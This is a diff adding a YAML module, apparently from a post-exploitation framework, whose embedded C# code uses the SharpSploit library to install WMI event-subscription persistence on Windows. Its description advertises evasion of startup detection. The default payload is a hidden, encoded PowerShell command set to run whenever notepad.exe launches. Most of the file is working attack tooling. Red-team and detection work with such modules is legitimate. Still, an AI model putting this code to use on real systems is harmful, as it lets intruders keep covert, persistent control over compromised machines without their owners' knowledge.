@@ -1,0 +1,201 @@
+name: PersistWMI
+authors:
+  - name: Anthony Rose
+    handle: Cx01N
+    link: https://twitter.com/Cx01N_
+description: |
+  C# module that establishes persistence through Windows Management Instrumentation (WMI) by
+  creating event filters, consumers, and bindings. Leverages WMI's event-driven architecture
+  to trigger payload execution based on system events such as process starts. Supports both
+  command-line execution and ActiveScript (JScript/VBScript) payloads, providing flexible
+  persistence mechanisms that can evade traditional startup detection while maintaining
+  stealth through legitimate WMI infrastructure.
+software: ''
+tactics: [TA0003]
+techniques: [T1546.003]
+background: false
+output_extension: ''
+needs_admin: false
+opsec_safe: true
+language: csharp
+min_language_version: ''
+options:
+  - name: EventName
+    description: An arbitrary name to be assigned to the new WMI Event.
+    required: true
+    value: Evil Persistence
+    strict: false
+    suggested_values: []
+  - name: EventFilter
+    description: Specifies the event trigger to use.
+    required: true
+    value: ProcessStart
+    strict: false
+    suggested_values: []
+  - name: EventConsumer
+    description: Specifies the action to carry out.
+    required: true
+    value: CommandLine
+    strict: false
+    suggested_values: []
+  - name: Payload
+    description: Specifies the CommandLine or ActiveScript payload to run.
+    required: true
+    value: 'powershell -Sta -Nop -Window Hidden -EncodedCommand <blah>'
+    strict: false
+    suggested_values: []
+  - name: ProcessName
+    description: Specifies the process name when the ProcessStart trigger is selected.
+    required: true
+    value: notepad.exe
+    strict: false
+    suggested_values: []
+  - name: ScriptingEngine
+    description: Specifies the scripting engine when the ActiveScript consumer is
+      selected.
+    required: false
+    value: VBScript
+    strict: false
+    suggested_values: []
+csharp:
+  UnsafeCompile: false
+  CompatibleDotNetVersions:
+    - Net35
+    - Net40
+  Code: |
+    using System;
+    using System.IO;
+    using SharpSploit.Persistence;
+
+    public static class Program
+    {
+        public static void Main(string[] args)
+        {
+            string eventName = args.Length > 0 ? args[0] : "";
+            string eventFilter = args.Length > 1 ? args[1] : "";
+            string eventConsumer = args.Length > 2 ? args[2] : "";
+            string payload = args.Length > 3 ? args[3] : "";
+            string processName = args.Length > 4 ? args[4] : "";
+            string scriptingEngine = args.Length > 5 ? args[5] : "";
+
+            string result = InstallWmiPersistence(eventName, eventFilter, eventConsumer, payload, processName, scriptingEngine);
+            Console.WriteLine(result);
+        }
+
+        public static string InstallWmiPersistence(string eventName, string eventFilter, string eventConsumer, string payload, string processName = "", string scriptingEngine = "")
+        {
+            using (StringWriter stringWriter = new StringWriter())
+            {
+                try
+                {
+                    WMI.EventFilter theEventFilter;
+                    WMI.EventConsumer theEventConsumer;
+                    WMI.ScriptingEngine theScriptingEngine;
+
+                    if (eventFilter.ToLower() == "processstart")
+                    {
+                        theEventFilter = WMI.EventFilter.ProcessStart;
+                    }
+                    else
+                    {
+                        return "WMI Persistence failed. Invalid Event Filter.";
+                    }
+
+                    if (eventConsumer.ToLower() == "commandline")
+                    {
+                        theEventConsumer = WMI.EventConsumer.CommandLine;
+                    }
+                    else if (eventConsumer.ToLower() == "activescript")
+                    {
+                        theEventConsumer = WMI.EventConsumer.ActiveScript;
+                    }
+                    else
+                    {
+                        return "WMI Persistence failed. Invalid Event Consumer.";
+                    }
+
+                    if (scriptingEngine.ToLower() == "jscript")
+                    {
+                        theScriptingEngine = WMI.ScriptingEngine.JScript;
+                    }
+                    else if (scriptingEngine.ToLower() == "vbscript")
+                    {
+                        theScriptingEngine = WMI.ScriptingEngine.VBScript;
+                    }
+                    else
+                    {
+                        return "WMI Persistence failed. Invalid Scripting Engine.";
+                    }
+
+                    if (WMI.InstallWMIPersistence(eventName, theEventFilter, theEventConsumer, payload, processName, theScriptingEngine))
+                    {
+                        stringWriter.WriteLine("WMI Persistence succeeded for: " + eventName);
+                    }
+                    else
+                    {
+                        stringWriter.WriteLine("WMI Persistence failed for: " + eventName);
+                    }
+                }
+                catch (Exception e)
+                {
+                    stringWriter.WriteLine(e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace);
+                }
+
+                return stringWriter.ToString();
+            }
+        }
+    }
+  ReferenceSourceLibraries:
+    - Name: SharpSploit
+      Description: SharpSploit is a library for C# post-exploitation modules.
+      Location: SharpSploit\SharpSploit\
+      Language: CSharp
+      CompatibleDotNetVersions:
+        - Net35
+        - Net40
+      ReferenceAssemblies:
+        - Name: System.Management.Automation.dll
+          Location: net35\System.Management.Automation.dll
+          DotNetVersion: Net35
+        - Name: System.Management.dll
+          Location: net40\System.Management.dll
+          DotNetVersion: Net40
+        - Name: System.Management.Automation.dll
+          Location: net40\System.Management.Automation.dll
+          DotNetVersion: Net40
+        - Name: System.IdentityModel.dll
+          Location: net40\System.IdentityModel.dll
+          DotNetVersion: Net40
+        - Name: System.dll
+          Location: net40\System.dll
+          DotNetVersion: Net40
+        - Name: System.DirectoryServices.dll
+          Location: net40\System.DirectoryServices.dll
+          DotNetVersion: Net40
+        - Name: System.Core.dll
+          Location: net40\System.Core.dll
+          DotNetVersion: Net40
+        - Name: mscorlib.dll
+          Location: net40\mscorlib.dll
+          DotNetVersion: Net40
+        - Name: System.Management.dll
+          Location: net35\System.Management.dll
+          DotNetVersion: Net35
+        - Name: mscorlib.dll
+          Location: net35\mscorlib.dll
+          DotNetVersion: Net35
+        - Name: System.Core.dll
+          Location: net35\System.Core.dll
+          DotNetVersion: Net35
+        - Name: System.DirectoryServices.dll
+          Location: net35\System.DirectoryServices.dll
+          DotNetVersion: Net35
+        - Name: System.dll
+          Location: net35\System.dll
+          DotNetVersion: Net35
+        - Name: System.IdentityModel.dll
+          Location: net35\System.IdentityModel.dll
+          DotNetVersion: Net35
+      EmbeddedResources: []
+  ReferenceAssemblies: []
+  EmbeddedResources: []
